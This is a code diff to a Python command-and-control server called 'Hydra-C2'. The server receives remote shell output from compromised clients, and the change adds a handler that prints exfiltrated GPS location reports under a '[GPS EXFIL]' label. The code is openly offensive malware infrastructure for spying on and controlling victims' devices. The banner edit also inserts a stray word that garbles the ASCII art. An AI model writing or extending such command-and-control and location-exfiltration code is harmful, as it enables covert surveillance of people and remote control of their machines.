@@ -9,14 +9,14 @@ import json
 
 def print_banner():
     banner = r"""
-    _    _           _              _____ ___  
-   | |  | |         | |            / ____|__ \ 
+    _    _           _               _____ ___  
+   | |  | |         | |             / ____|__ \ 
    | |__| |_   _  __| |_ __ __ _  | |       ) |
    |  __  | | | |/ _` | '__/ _` | | |      / / 
    | |  | | |_| | (_| | | | (_| | | |____ / /_ 
-   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
-            __/ |                              
-           |___/                               
+   |_|  |_|\__, |\__,_|_|  \__,_Sequence|____|____|
+            __/ |                               
+           |___/                                
 
     >> Project Hydra-C2: Multi-headed Framework
     >> Status: Online | SSL: Enabled
@@ -85,12 +85,21 @@ async def checkin(client_id: str, platform: str, request: Request):
 @app.post("/report/{client_id}")
 async def report_output(client_id: str, request: Request):
     data = await request.json()
-    output = data.get("output", "No output")
     
-    print(f"\n[+] SHELL_OUTPUT FROM {client_id}:")
-    print("-" * 40)
-    print(output.strip())
-    print("-" * 40 + "\n")
+    # Distinguish between location updates and shell output
+    report_type = data.get("type", "shell_output")
+    content = data.get("data") or data.get("output") or "No output"
+    
+    if report_type == "location_update":
+        print(f"\n📍 [GPS EXFIL] FROM {client_id}:")
+        print("-" * 40)
+        print(content.strip())
+        print("-" * 40 + "\n")
+    else:
+        print(f"\n[+] SHELL_OUTPUT FROM {client_id}:")
+        print("-" * 40)
+        print(content.strip())
+        print("-" * 40 + "\n")
     
     return {"status": "received"}
 
